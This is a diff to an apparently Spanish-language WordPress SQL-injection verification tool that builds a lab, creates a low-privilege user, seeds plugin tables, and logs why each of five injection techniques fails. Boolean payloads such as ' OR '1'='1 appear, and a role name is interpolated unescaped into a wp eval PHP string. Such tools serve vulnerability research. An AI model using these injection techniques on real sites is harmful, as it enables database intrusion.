@@ -152,6 +152,10 @@ class WpVerifyResult:
     # analista los lee -- no filtran nada de ningun objetivo real, y sirven como prueba dura de que
     # el flujo se ejecuto de verdad, no que se simulo.
     evidence: dict = field(default_factory=dict)
+    # traza estructurada de cada técnica que falló: [{attempt_n, technique, endpoint, param,
+    # causa, detail, diff_bytes}] — permite al motor y al analista saber EXACTAMENTE por qué
+    # falló cada intento sin relanzar el ataque a mano.
+    failure_trace: list = field(default_factory=list)
 
 
 def _run(cmd: List[str], timeout: float = 60.0, input_text: str = None) -> subprocess.CompletedProcess:
@@ -205,6 +209,26 @@ def _scrape_nonce_candidates(html: str) -> list:
             if v not in found:
                 found.append(v)
     return found
+
+
+def _quick_causa(body: str, status: int) -> str:
+    """Clasifica el motivo de fallo de un intento de lab en una palabra, sin duplicar
+    la lógica completa de _diagnose_failure (que vive en cve_agent.py)."""
+    if status == 404 or "404" in (body or "")[:80]:
+        return "404"
+    b = (body or "").lower()
+    if any(t in b for t in ("invalid nonce", "wrong nonce", "invalid security",
+                            "security check failed", "nonce_mismatch", "_wpnonce")):
+        return "nonce"
+    if status in (401, 403) or any(t in b for t in
+                                   ("you must log in", "please log in", "forbidden",
+                                    "acceso denegado", "login required")):
+        return "auth"
+    if b.strip() in ("{}", "[]", "", "null") or not b.strip():
+        return "empty"
+    if status == 500:
+        return "error_500"
+    return "unknown"
 
 
 def _list_real_page_urls(lab, limit: int = 12) -> list:
@@ -1563,6 +1587,9 @@ class _LabSession:
     db_pw: str = ""                           # Password de MySQL del lab (para exec_mysql / seed data)
 
 
+_WP_STANDARD_ROLES = {"subscriber", "contributor", "author", "editor", "administrator"}
+
+
 def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: WpVerifyResult,
                    t0: float, budget_s: float,
                    setup_wp_options: Optional[list] = None,
@@ -1570,7 +1597,8 @@ def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: Wp
                    shortcode_name: Optional[str] = None,
                    relationship_table: Optional[dict] = None,
                    wp_debug_display: bool = False,
-                   extra_setup_trigger_paths: Optional[list] = None) -> Optional[_LabSession]:
+                   extra_setup_trigger_paths: Optional[list] = None,
+                   required_role: str = "subscriber") -> Optional[_LabSession]:
     """Pasos 1-4 compartidos (ver _LabSession). Devuelve None si algo falla, con `res` ya relleno
     (detail/logs/limitations) -- el caller solo tiene que `return res` sin mas logica.
 
@@ -2287,22 +2315,29 @@ def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: Wp
                 admin_sess.get(base_url + trigger_path, timeout=20)
             except Exception:
                 pass
-    step("Creando el usuario de bajo privilegio (subscriber)...")
+    step(f"Creando el usuario de bajo privilegio ({required_role})...")
+    # Registrar rol custom si no es un rol WP estándar
+    if required_role not in _WP_STANDARD_ROLES:
+        lab.wp_cli("eval",
+                   f"add_role('{required_role}', '{required_role}', array('read' => true));",
+                   timeout=20)
+        step(f"rol custom '{required_role}' registrado via wp eval add_role()")
 
     r = lab.wp_cli("user", "create", sub_user, "subscriber@binoracle-lab.invalid",
-                   "--role=subscriber", f"--user_pass={sub_pass}", timeout=30)
+                   f"--role={required_role}", f"--user_pass={sub_pass}", timeout=30)
     if r.returncode != 0:
-        res.detail = f"creacion del subscriber fallo: {(r.stderr or r.stdout or '')[:300]}"
+        res.detail = (f"creacion del usuario de bajo privilegio ({required_role}) fallo: "
+                      f"{(r.stderr or r.stdout or '')[:300]}")
         res.evidence["screenshots"] = shots
         return None
     step("capturando pantalla: usuario de bajo privilegio creado de verdad (lista de "
          "usuarios, vista admin)...")
     if admin_sess is not None:
         capture(admin_sess, "/wp-admin/users.php",
-               f"Paso 3: cuenta '{sub_user}' creada de verdad con rol Subscriber (vista de "
+               f"Paso 3: cuenta '{sub_user}' creada de verdad con rol {required_role} (vista de "
                f"la lista de usuarios del admin) -- el unico acceso que tiene el atacante "
                f"antes de explotar nada.",
-               f"Step 3: account '{sub_user}' really created with the Subscriber role (admin's "
+               f"Step 3: account '{sub_user}' really created with the {required_role} role (admin's "
                f"user list view) -- the only access the attacker has before exploiting "
                f"anything.")
 
@@ -4012,8 +4047,115 @@ def _detect_plugin_tables(plugin_source_dir: str) -> list:
     return sorted(table_counts, key=lambda t: -table_counts[t])
 
 
+_CT_RE = re.compile(
+    r'CREATE\s+TABLE\s+(?:IF\s+NOT\s+EXISTS\s+)?'
+    r'[`\'\"]?(?:\{[^}]+\}|\$[a-zA-Z_]+->(?:prefix|base_prefix))?([a-z0-9_]+)[`\'\"]?\s*\(',
+    re.IGNORECASE)
+_COL_RE = re.compile(
+    r'^\s*[`\'\"]?([a-z0-9_]+)[`\'\"]?\s+'
+    r'((?:tiny|small|medium|big)?int(?:eger)?(?:\(\d+\))?|bigint(?:\(\d+\))?'
+    r'|varchar(?:\(\d+\))?|char(?:\(\d+\))?|text|mediumtext|longtext|tinytext'
+    r'|datetime|timestamp|date|float(?:\(\d+,\d+\))?|double(?:\(\d+,\d+\))?'
+    r'|decimal(?:\(\d+,\d+\))?|blob|enum\([^)]+\))',
+    re.IGNORECASE)
+_COL_NOT_NULL_RE = re.compile(r'\bNOT\s+NULL\b', re.IGNORECASE)
+_COL_DEFAULT_RE = re.compile(r"\bDEFAULT\s+'?([^',\s)]+)'?", re.IGNORECASE)
+_COL_AUTO_RE = re.compile(r'\bAUTO_INCREMENT\b', re.IGNORECASE)
+_ENUM_VALS_RE = re.compile(r"enum\(([^)]+)\)", re.IGNORECASE)
+
+
+def _extract_schema_from_plugin(plugin_source_dir: str) -> dict:
+    """Escanea los .php del plugin buscando sentencias CREATE TABLE y extrae el schema
+    de columnas. Devuelve {table_name: [{name, type, nullable, default, auto}]}."""
+    schema: dict = {}
+    if not plugin_source_dir or not os.path.isdir(plugin_source_dir):
+        return schema
+    for root, _dirs, files in os.walk(plugin_source_dir):
+        for fname in files:
+            if not fname.endswith(".php"):
+                continue
+            fpath = os.path.join(root, fname)
+            try:
+                with open(fpath, encoding="utf-8", errors="ignore") as fh:
+                    src = fh.read()
+            except Exception:
+                continue
+            for m in _CT_RE.finditer(src):
+                tbl = m.group(1).lower()
+                # find the closing paren for this CREATE TABLE
+                start = m.end()
+                depth = 1
+                pos = start
+                while pos < len(src) and depth > 0:
+                    if src[pos] == '(':
+                        depth += 1
+                    elif src[pos] == ')':
+                        depth -= 1
+                    pos += 1
+                body = src[start:pos - 1]
+                cols = []
+                for line in body.split("\n"):
+                    cm = _COL_RE.match(line)
+                    if not cm:
+                        continue
+                    col_name = cm.group(1).lower()
+                    if col_name in ("primary", "unique", "key", "index", "constraint",
+                                    "fulltext", "spatial"):
+                        continue
+                    col_type = cm.group(2).lower()
+                    nullable = not bool(_COL_NOT_NULL_RE.search(line))
+                    auto = bool(_COL_AUTO_RE.search(line))
+                    dm = _COL_DEFAULT_RE.search(line)
+                    default = dm.group(1) if dm else None
+                    cols.append({"name": col_name, "type": col_type,
+                                 "nullable": nullable, "default": default, "auto": auto})
+                if cols and tbl not in schema:
+                    schema[tbl] = cols
+    return schema
+
+
+def _schema_insert_values(cols: list, sqli_param: str = "",
+                          sqli_param_value: str = "") -> tuple:
+    """Construye (col_list, val_list) para INSERT desde schema extraído."""
+    _TEXT_COLS = {"uri": "/test-page", "page": "/", "url": "http://example.com",
+                  "slug": "test-post", "path": "/test", "query": "test",
+                  "email": "seed@example.com", "username": "seeduser", "user": "seeduser",
+                  "code": "SEED1", "token": "seedtoken", "key": "seedkey",
+                  "hash": "seedhash", "ref": "seedref", "name": "seedname",
+                  "title": "Seed Title", "content": "seed content", "status": "active"}
+    col_names, col_vals = [], []
+    for c in cols:
+        if c.get("auto"):
+            continue
+        if not c.get("nullable") and c.get("default") is None:
+            cname = c["name"]
+            ctype = c["type"]
+            if any(t in ctype for t in ("int", "float", "double", "decimal")):
+                val = "1"
+            elif "enum" in ctype:
+                em = _ENUM_VALS_RE.search(ctype)
+                val = em.group(1).split(",")[0].strip("'\" ") if em else "1"
+                val = f"'{val}'"
+            elif any(t in ctype for t in ("datetime", "timestamp")):
+                val = "NOW()"
+            elif "date" in ctype:
+                val = "'2024-01-01'"
+            else:
+                # text/varchar: use sqli_param_value if column name matches
+                if sqli_param and cname == sqli_param.lower() and sqli_param_value:
+                    sv = sqli_param_value.replace("'", "\\'")[:100]
+                    val = f"'{sv}'"
+                else:
+                    hint_val = _TEXT_COLS.get(cname)
+                    val = f"'{hint_val}'" if hint_val else "'seed'"
+            col_names.append(f"`{cname}`")
+            col_vals.append(val)
+    return col_names, col_vals
+
+
 def _seed_plugin_tables(lab: "_Lab", db_pw: str, tables: list, step,
-                        sqli_param: str = "", sqli_param_value: str = "") -> int:
+                        sqli_param: str = "", sqli_param_value: str = "",
+                        plugin_source_dir: str = "") -> int:
     """Intenta sembrar una fila minima en cada tabla personalizada del plugin (hasta 3 tablas,
     las mas frecuentes segun _detect_plugin_tables). Usa IGNORE para no fallar si la fila ya
     existe o si la tabla no tiene las columnas esperadas. Devuelve el numero de tablas sembradas.
@@ -4050,7 +4192,7 @@ def _seed_plugin_tables(lab: "_Lab", db_pw: str, tables: list, step,
             if r is not None:
                 inserted = True
                 break
-        # Fallback: DESCRIBE para descubrir columnas NOT NULL y construir INSERT válido
+        # Fallback 3: DESCRIBE para descubrir columnas NOT NULL y construir INSERT válido
         if not inserted:
             desc_r = lab.exec_mysql(f"DESCRIBE {full};", db_pw)
             if desc_r is None:
@@ -4078,6 +4220,22 @@ def _seed_plugin_tables(lab: "_Lab", db_pw: str, tables: list, step,
                 r2 = lab.exec_mysql(q_desc, db_pw)
                 if r2 is not None:
                     inserted = True
+        # Fallback 4: schema extraído del código PHP (más preciso que DESCRIBE porque conoce
+        # los valores semánticos por nombre de columna y el valor real del param del PoC).
+        if not inserted and plugin_source_dir:
+            _schema = _extract_schema_from_plugin(plugin_source_dir)
+            _schema_cols = _schema.get(tbl, [])
+            if _schema_cols:
+                _scol_names, _scol_vals = _schema_insert_values(
+                    _schema_cols, sqli_param=sqli_param, sqli_param_value=sqli_param_value)
+                if _scol_names:
+                    _q_schema = (f"INSERT IGNORE INTO {full} "
+                                 f"({', '.join(_scol_names)}) VALUES ({', '.join(_scol_vals)});")
+                    r3 = lab.exec_mysql(_q_schema, db_pw)
+                    if r3 is not None:
+                        inserted = True
+                        step(f"seed data (schema PHP): INSERT en {full} con "
+                             f"{len(_scol_names)} columnas inferidas del CREATE TABLE")
         # Si el sqli_param coincide con una columna de texto común, actualizar esa columna
         # para que la fila seeded tenga un valor consultable (diferencial booleano más limpio).
         if inserted and sqli_param:
@@ -4124,6 +4282,7 @@ def verify_wordpress_sqli(
     _boot_ref: Optional[list] = None,
     _lab_ref: Optional[list] = None,
     json_body: bool = False,
+    required_role: str = "subscriber",
 ) -> WpVerifyResult:
     """Verifica SQL injection con CINCO tecnicas, de mas a menos dura, probando varios contextos
     de inyeccion (numerico sin comillas, comilla simple, comilla doble, cierre de parentesis) y
@@ -4270,7 +4429,8 @@ def verify_wordpress_sqli(
                                   companion_plugins=companion_plugins,
                                   shortcode_name=shortcode_name,
                                   relationship_table=relationship_table if attack_endpoint_is_bare_root else None,
-                                  extra_setup_trigger_paths=extra_setup_trigger_paths)
+                                  extra_setup_trigger_paths=extra_setup_trigger_paths,
+                                  required_role=required_role)
             if boot is None:
                 return res
             # Expose boot + lab to caller for persistent-lab mode
@@ -4843,7 +5003,8 @@ def verify_wordpress_sqli(
             if _plugin_tables:
                 _seeded = _seed_plugin_tables(lab, boot.db_pw, _plugin_tables, step,
                                              sqli_param=sqli_param,
-                                             sqli_param_value=orig_value)
+                                             sqli_param_value=orig_value,
+                                             plugin_source_dir=plugin_source_dir)
                 if _seeded:
                     _preseed_len = base_len
                     _preseed_body = _ctrl_body
@@ -4875,7 +5036,8 @@ def verify_wordpress_sqli(
                                 if _new_tables:
                                     _seeded2 = _seed_plugin_tables(lab, boot.db_pw, _new_tables, step,
                                                                    sqli_param=sqli_param,
-                                                                   sqli_param_value=orig_value)
+                                                                   sqli_param_value=orig_value,
+                                                                   plugin_source_dir=plugin_source_dir)
                                     if _seeded2:
                                         base_resp = send(orig_value)
                                         base_len = len(base_resp.text or "")
@@ -5015,6 +5177,17 @@ def verify_wordpress_sqli(
         res.evidence["error_based_intentos"] = error_tried
         res.evidence["error_based_intentos_resumen"] = (f"{len(error_tried)} combinaciones "
                                                          f"probadas, ninguna filtro version()")
+        _ctrl_causa_eb = _quick_causa(res.evidence.get("respuesta_control_recorte", ""),
+                                      base_resp.status_code)
+        step(f"[técnica error-based] FALLO: {len(error_tried)} payloads probados, "
+             f"ninguno filtró version() — control: status={base_resp.status_code} "
+             f"{base_len}B causa={_ctrl_causa_eb}")
+        res.failure_trace.append({
+            "attempt_n": 1, "technique": "error-based", "endpoint": endpoint,
+            "param": sqli_param, "causa": _ctrl_causa_eb,
+            "detail": f"{len(error_tried)} payloads, ninguno filtró version()",
+            "diff_bytes": 0,
+        })
 
         step("error-based no filtro nada; probando UNION-based (fuerza bruta de columnas) para "
              "extraer version() real...")
@@ -5077,6 +5250,14 @@ def verify_wordpress_sqli(
         res.evidence["union_intentos"] = union_tried
         res.evidence["union_intentos_resumen"] = (f"{len(union_tried)} combinaciones probadas, "
                                                    f"ninguna filtro version()")
+        step(f"[técnica UNION-based] FALLO: {len(union_tried)} payloads probados, "
+             f"ninguno filtró version() en la respuesta")
+        res.failure_trace.append({
+            "attempt_n": 2, "technique": "UNION-based", "endpoint": endpoint,
+            "param": sqli_param, "causa": "version_no_filtrada",
+            "detail": f"{len(union_tried)} combinaciones, ninguna filtró version()",
+            "diff_bytes": 0,
+        })
         step("UNION no filtro nada; probando boolean-based (diferencial TRUE/FALSE)...")
         pairs = [
             (f"{orig_value}' OR '1'='1", f"{orig_value}' OR '1'='2"),
@@ -5205,6 +5386,19 @@ def verify_wordpress_sqli(
         # ultimo recurso: time-based blind. Si el contenido/longitud de la respuesta nunca cambia
         # (p.ej. la pagina siempre devuelve lo mismo independientemente del resultado del query),
         # SLEEP(5) vs SLEEP(0) en la misma condicion mide un retraso real en vez de comparar texto.
+        _bool_max_diff = max((abs(len(r.text or "") - len(s.text or "")) if isinstance(r, object) and hasattr(r, "text") and isinstance(s, object) and hasattr(s, "text") else 0
+                              for r, s in [(None, None)]), default=0)
+        step(f"[técnica boolean-blind] FALLO: {consistent_diffs}/{len(pairs)} pares con "
+             f"diferencia de longitud (umbral: 2), "
+             f"{getattr(locals().get('_content_consistent', None), '__class__', type(0)).__name__}="
+             f"{locals().get('_content_consistent', 0)} pares content-diff — señal insuficiente")
+        res.failure_trace.append({
+            "attempt_n": 3, "technique": "boolean-blind", "endpoint": endpoint,
+            "param": sqli_param, "causa": "señal_insuficiente",
+            "detail": (f"consistent_diffs={consistent_diffs}/{len(pairs)}, "
+                       f"content_diffs={locals().get('_content_consistent', 0)}/{len(pairs)}"),
+            "diff_bytes": 0,
+        })
         step("boolean-blind no mostro diferencia; probando time-based blind (SLEEP/pg_sleep/"
              "WAITFOR)...")
         # MySQL SLEEP() en varios contextos, mas pg_sleep() (PostgreSQL) y WAITFOR DELAY (MSSQL,
@@ -5290,6 +5484,17 @@ def verify_wordpress_sqli(
             step(f"VERIFICADO (time-based blind): {timing_consistent}/{len(timing_pairs)} pares "
                  f"mostraron retraso consistente")
         else:
+            _max_single_delay_local = max(_slow_times) if _slow_times else 0.0
+            step(f"[técnica time-based blind] FALLO: {timing_consistent}/{len(timing_pairs)} "
+                 f"pares con delay >=3.5s (umbral: 2 pares o 1 par >=8s), "
+                 f"max_delay={_max_single_delay_local:.1f}s")
+            res.failure_trace.append({
+                "attempt_n": 4, "technique": "time-based blind", "endpoint": endpoint,
+                "param": sqli_param, "causa": "delay_insuficiente",
+                "detail": (f"timing_consistent={timing_consistent}/{len(timing_pairs)}, "
+                           f"max_delay={_max_single_delay_local:.1f}s"),
+                "diff_bytes": 0,
+            })
             # ultimo recurso (5): contexto ORDER BY. Todo lo anterior asume una clausula WHERE
             # -- el payload es '<valor original><cierre> AND/OR <condicion>', apoyado en que el
             # valor original SIGUE siendo parte de una comparacion real. Un sumidero que mete el
@@ -5455,6 +5660,17 @@ def verify_wordpress_sqli(
                 # fatal de PHP, un redirect inesperado, o un cuerpo vacio apuntan a algo del
                 # servidor/la ruta del ataque, no a que el payload sea el equivocado.
                 control_sample = res.evidence.get("respuesta_control_recorte") or ""
+                step(f"[técnica ORDER BY] FALLO: {orderby_timing_consistent}/"
+                     f"{len(orderby_timing_tried) or 1} subconsultas con delay — "
+                     f"ninguna técnica SQLi confirmó la vulnerabilidad en este lab")
+                res.failure_trace.append({
+                    "attempt_n": 5, "technique": "ORDER BY", "endpoint": endpoint,
+                    "param": sqli_param, "causa": "sin_señal",
+                    "detail": (f"orderby_timing={orderby_timing_consistent}/"
+                                f"{len(orderby_timing_tried) or 1}; "
+                                f"5 técnicas agotadas sin confirmación"),
+                    "diff_bytes": 0,
+                })
                 res.detail = (
                     f"error-based ({len(error_tried)}) y UNION-based ({len(union_tried)}) no "
                     f"filtraron version(), boolean-blind no mostro diferencia consistente "
